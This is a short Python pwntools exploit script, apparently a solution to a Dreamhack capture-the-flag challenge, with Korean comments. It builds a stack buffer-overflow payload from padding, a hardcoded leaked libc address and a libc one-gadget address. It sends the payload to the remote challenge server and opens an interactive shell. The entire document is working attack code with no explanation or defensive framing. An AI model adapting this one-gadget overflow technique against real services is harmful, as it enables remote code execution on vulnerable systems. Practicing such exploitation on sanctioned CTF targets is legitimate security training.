from pwn import *

connection = remote('host1.dreamhack.games', 12197)  # 연결하는 명령어

E = ELF("./libc.so.6")           


buffer_cover = b'E'*24 
size_cover = b'0'*8        
rbp_cover = b'A'*8        

base = 0x7fa53b1e0620
offset = base - E.symbols['_IO_2_1_stdout_']
ret_gadget_addr = offset+ 0x45216 

payload = buffer_cover + size_cover  + rbp_cover + p64(base) + p64(ret_gadget_addr)
print(payload)
connection.sendafter("MSG: " , payload)   # payload 전송
connection.interactive()